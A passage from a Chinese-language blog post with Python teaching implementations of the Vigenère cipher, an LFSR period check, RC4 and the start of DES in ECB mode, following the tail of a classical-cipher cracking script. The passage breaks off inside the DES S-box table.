   <span class="hljs-comment"># criphertext = 'falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj'</span>
    criphertext = input(<span class="hljs-string">"请输入要破解的密文: "</span>)
    criphertext = criphertext.lower()
    print(<span class="hljs-string">"---------"</span>*<span class="hljs-number">3</span>+<span class="hljs-string">"strat attck"</span>+<span class="hljs-string">"---------"</span>*<span class="hljs-number">3</span>)
    decode(criphertext)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
     main()</code></pre></div>

<p>效果如下</p>
<img src="https://i.loli.net/2020/12/23/lrQLWVebkuphvTK.png" srcset="/img/loading.gif" alt="image-20201223170037595" style="zoom:67%;">

<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列<a href="https://baike.baidu.com/item/凯撒密码" target="_blank" rel="noopener">凯撒密码</a>组成密码字母表的加密算法，属于多表密码的一种简单形式。</p>
<p>维吉尼亚密码曾多次被发明。该方法最早记录在<a href="https://baike.baidu.com/item/吉奥万·巴蒂斯塔·贝拉索" target="_blank" rel="noopener">吉奥万·巴蒂斯塔·贝拉索</a>（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（<a href="https://baike.baidu.com/item/意大利语" target="_blank" rel="noopener">意大利语</a>：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是<a href="https://baike.baidu.com/item/法国" target="_blank" rel="noopener">法国</a>外交官<a href="https://baike.baidu.com/item/布莱斯·德·维吉尼亚" target="_blank" rel="noopener">布莱斯·德·维吉尼亚</a>（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。</p>
<p>维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。</p>
<h3 id="2-加解密原理"><a href="#2-加解密原理" class="headerlink" title="2.加解密原理"></a>2.加解密原理</h3><img src="https://i.loli.net/2020/12/23/DFHntXC9Ysp6dyV.png" srcset="/img/loading.gif" alt="image-20201223225441528" style="zoom:67%;">



<p>加解密代码</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># 将密钥处理成和密文/明文一样长</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_key</span><span class="hljs-params">(s,key)</span>:</span>
    nkey = key
    <span class="hljs-keyword">while</span> len(nkey) &lt; len(s):
        nkey = nkey+key
    nkey = nkey[:len(s)]
    <span class="hljs-keyword">return</span> nkey

<span class="hljs-comment"># 加密函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(s,key)</span>:</span>
    print(<span class="hljs-string">'加密后的结果： '</span>,end=<span class="hljs-string">''</span>)
    s1 = s.upper()
    key1 = solve_key(s, key)
    key1 = key1.upper()

    result = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(s)):
        s2 = chr(abs(((ord(s1[i])<span class="hljs-number">-65</span>)+(ord(key1[i])<span class="hljs-number">-65</span>)) % <span class="hljs-number">26</span>) + <span class="hljs-number">65</span>)
        result = result + s2
    print(result.lower())

<span class="hljs-comment"># 解密函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(s,key)</span>:</span>
    print(<span class="hljs-string">'解密后的结果： '</span>, end=<span class="hljs-string">''</span>)
    s1 = s.upper()
    key1 = solve_key(s, key)
    key1 = key1.upper()

    result = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):
        s2 = chr(((ord(s1[i]) - <span class="hljs-number">65</span>) - (ord(key1[i]) - <span class="hljs-number">65</span>)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)
        result = result + s2
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        <span class="hljs-comment"># 函数入口</span>
        answer = input(<span class="hljs-string">f'请输入所需的操作：编码/E or 解码/D:  '</span>)
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">'E'</span>:
                key = input(<span class="hljs-string">'请输入密钥: '</span>)
                key = <span class="hljs-string">""</span>.join(filter(str.isalpha, key))
                s = input(<span class="hljs-string">'请输入明文: '</span>)
                s = <span class="hljs-string">""</span>.join(filter(str.isalpha, s))  <span class="hljs-comment"># 将字符串中的非字母字符去掉</span>
                <span class="hljs-comment"># print(s)</span>
                encode(s, key)
            <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">'D'</span>:
                key = input(<span class="hljs-string">'请输入密钥: '</span>)
                key = <span class="hljs-string">""</span>.join(filter(str.isalpha, key))
                s = input(<span class="hljs-string">'请输入密文: '</span>)
                s = <span class="hljs-string">""</span>.join(filter(str.isalpha, s))
                decode(s, key)
            <span class="hljs-keyword">else</span>:
                print(<span class="hljs-string">'输入错误！'</span>)
        <span class="hljs-keyword">except</span> KeyError:
            print(<span class="hljs-string">'请检查输入是否正确！'</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre></div>





<h1 id="二、序列密码"><a href="#二、序列密码" class="headerlink" title="二、序列密码"></a>二、序列密码</h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>代码实现</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lsrf</span><span class="hljs-params">(inti, top)</span>:</span>
    sum = <span class="hljs-number">0</span>
    inti2 = <span class="hljs-string">"0"</span>*len(inti)
    inti2 = list(inti2)
    inti1 = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(inti)):
        <span class="hljs-keyword">if</span> top[i] == <span class="hljs-string">"1"</span>:
            sum += int(inti[i])
    sum = sum % <span class="hljs-number">2</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(inti)):
        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
            inti2[i] = str(sum)
        <span class="hljs-keyword">else</span>:
            inti2[i] = inti[i - <span class="hljs-number">1</span>]
    inti1 = inti1.join(inti2)
    <span class="hljs-keyword">return</span> inti1

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    inti_str = str(input(<span class="hljs-string">"请输入初始化序列："</span>))
    inti_str = inti_str[::<span class="hljs-number">-1</span>]
    inti_str_backup = inti_str
    top = str(input(<span class="hljs-string">"请输入本原多项式："</span>))
    top = top[::<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span> ** len(inti_str) + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i == <span class="hljs-number">2</span> ** len(inti_str) - <span class="hljs-number">1</span>:
            print(<span class="hljs-string">"第&#123;0&#125;次"</span>.format(i), inti_str_backup)
            print(<span class="hljs-string">"是本原多项式且周期是"</span> + str(i))
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">elif</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i != <span class="hljs-number">2</span> ** len(inti_str) - <span class="hljs-number">1</span>:
            print(<span class="hljs-string">"第&#123;0&#125;次"</span>.format(i), inti_str_backup)
            print(<span class="hljs-string">"不是本原多项式且周期是"</span> + str(i))
            <span class="hljs-keyword">break</span>
        print(<span class="hljs-string">"第&#123;0&#125;次"</span>.format(i), inti_str_backup)
        inti_str_backup = lsrf(inti_str_backup, top)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre></div>

<p>选择本原多项式和初始序列如下</p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">100000000001000000</span>
<span class="hljs-number">011100010100100101</span></code></pre></div>

<p>程序运行结果</p>
<p><img src="https://i.loli.net/2020/12/23/gfbRGZ57piKChWS.png" srcset="/img/loading.gif" alt="image-20201223222649800"></p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>完整代码</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> base64

<span class="hljs-comment"># S盒初始化置换,Key为密钥</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Rc4_init</span><span class="hljs-params">(S, Key)</span>:</span>
    j = <span class="hljs-number">0</span>
    Key = Key.encode(<span class="hljs-string">'UTF-8'</span>)
    Key = hashlib.md5(Key).hexdigest()  <span class="hljs-comment"># 长度为32的字符串</span>
    tmp = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
        S.append(i)
        tmp.append(Key[i % len(Key)])
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):
        j = (j + S[i] + ord(tmp[i])) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]             <span class="hljs-comment"># 交换S[i],S[j]</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Encode</span><span class="hljs-params">(S, plaintext)</span>:</span>
    i = j = <span class="hljs-number">0</span>
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> plaintext:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + S[i]) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % <span class="hljs-number">256</span>
        k = chr(ord(a) ^ S[t])
        result += k
    result = base64.b64encode(result.encode(<span class="hljs-string">'UTF-8'</span>))
    result = result.decode()
    <span class="hljs-keyword">return</span> result


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Decode</span><span class="hljs-params">(S, criphtext)</span>:</span>
    i = j = <span class="hljs-number">0</span>
    criphtext = base64.b64decode(criphtext)
    criphtext = str(criphtext.decode())
    result = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> criphtext:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + S[i]) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % <span class="hljs-number">256</span>
        k = chr(ord(a) ^ S[t])
        result += k
    <span class="hljs-keyword">return</span> result

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        order = input(<span class="hljs-string">"请输入指令,加密/E,解密/D :"</span>)
        <span class="hljs-keyword">if</span> order.upper() ==<span class="hljs-string">'E'</span>:
            plaintext = input(<span class="hljs-string">'请输入明文: '</span>)
            key = input(<span class="hljs-string">"请输入密钥: "</span>)
            s = []
            Rc4_init(s, key)
            cryphtext = rc4_Encode(s, plaintext)
            print(<span class="hljs-string">"密文为: "</span>, cryphtext)
            print(<span class="hljs-string">'\n'</span>)

        <span class="hljs-keyword">else</span>:
            cryphtext = input(<span class="hljs-string">"请输入密文: "</span>)
            key = input(<span class="hljs-string">"请输入密钥: "</span>)
            s = []
            Rc4_init(s, key)
            plaintext = rc4_Decode(s, cryphtext)
            print(<span class="hljs-string">"明文为: "</span>, plaintext)
            print(<span class="hljs-string">'\n'</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre></div>



<h1 id="三、DES"><a href="#三、DES" class="headerlink" title="三、DES"></a>三、DES</h1><p>DEC_ECB模式</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># 两字符进行异或运算</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(str1, str2)</span>:</span>
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(str1)):
        xor_res = int(str1[i], <span class="hljs-number">10</span>)^int(str2[i], <span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> xor_res == <span class="hljs-number">1</span>:
            res += <span class="hljs-string">'1'</span>
        <span class="hljs-keyword">else</span>:
            res += <span class="hljs-string">'0'</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 处理字符串，将每个字符串都转成八位二进制数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_process</span><span class="hljs-params">(str)</span>:</span>
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str:
        tmp = bin(ord(i))[<span class="hljs-number">2</span>:]
        tmp = (<span class="hljs-number">8</span> - len(tmp)) * <span class="hljs-string">'0'</span> + tmp  <span class="hljs-comment"># 不够八位则在前面补 0</span>
        res += tmp
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># PC-1盒处理</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_change_1</span><span class="hljs-params">(str)</span>:</span>
    change_table = [<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,
                 <span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,
                 <span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,
                 <span class="hljs-number">3</span>,<span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,
                 <span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,
                 <span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,
                 <span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>]
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += str[i<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># PC-2盒处理</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_change_2</span><span class="hljs-params">(str)</span>:</span>
    change_table = [<span class="hljs-number">14</span>,<span class="hljs-number">17</span>,<span class="hljs-number">11</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">28</span>,
                 <span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">21</span>,<span class="hljs-number">10</span>,<span class="hljs-number">23</span>,<span class="hljs-number">19</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,
                 <span class="hljs-number">26</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">27</span>,<span class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,
                 <span class="hljs-number">41</span>,<span class="hljs-number">52</span>,<span class="hljs-number">31</span>,<span class="hljs-number">37</span>,<span class="hljs-number">47</span>,<span class="hljs-number">55</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,
                 <span class="hljs-number">51</span>,<span class="hljs-number">45</span>,<span class="hljs-number">33</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">39</span>,<span class="hljs-number">56</span>,
                 <span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">46</span>,<span class="hljs-number">42</span>,<span class="hljs-number">50</span>,<span class="hljs-number">36</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span>]
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += str[i<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># 循环左移</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">left_run</span><span class="hljs-params">(str, num)</span>:</span>
    tmp_str = str[num:len(str)]
    tmp_str = tmp_str+str[<span class="hljs-number">0</span>:num]
    <span class="hljs-keyword">return</span> tmp_str


<span class="hljs-comment"># 生成16个子密钥</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_gen</span><span class="hljs-params">(str)</span>:</span>
    key_list = []
    key_change_res = key_change_1(str)
    key_c = key_change_res[<span class="hljs-number">0</span>:<span class="hljs-number">28</span>]
    key_d = key_change_res[<span class="hljs-number">28</span>:]
    num = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>): <span class="hljs-comment">#共16轮</span>
        key_c = left_run(key_c, num[i])
        key_d = left_run(key_d, num[i])
        key_yiwei = key_c + key_d
        key_res = key_change_2(key_yiwei)
        key_list.append(key_res)
    <span class="hljs-keyword">return</span> key_list

<span class="hljs-comment"># IP盒处理</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">begin_change</span><span class="hljs-params">(str)</span>:</span>
    change_table = [<span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,
                   <span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,
                   <span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,
                   <span class="hljs-number">64</span>,<span class="hljs-number">56</span>,<span class="hljs-number">48</span>,<span class="hljs-number">40</span>,<span class="hljs-number">32</span>,<span class="hljs-number">24</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,
                   <span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,
                   <span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,
                   <span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,
                   <span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,<span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>]
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += str[i<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># E盒处理  32位-&gt;48位</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">E_box</span><span class="hljs-params">(str)</span>:</span>
    change_table = [<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,
                    <span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,
                    <span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,
                    <span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,
                    <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,
                    <span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>]
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += str[i<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># s盒处理   48位-&gt;32位</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">S_box</span><span class="hljs-params">(str)</span>:</span>
    j = <span class="hljs-number">0</span>
    s_list = [[<span class="hljs-number">14</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>],
              [<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>],
              [<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>],
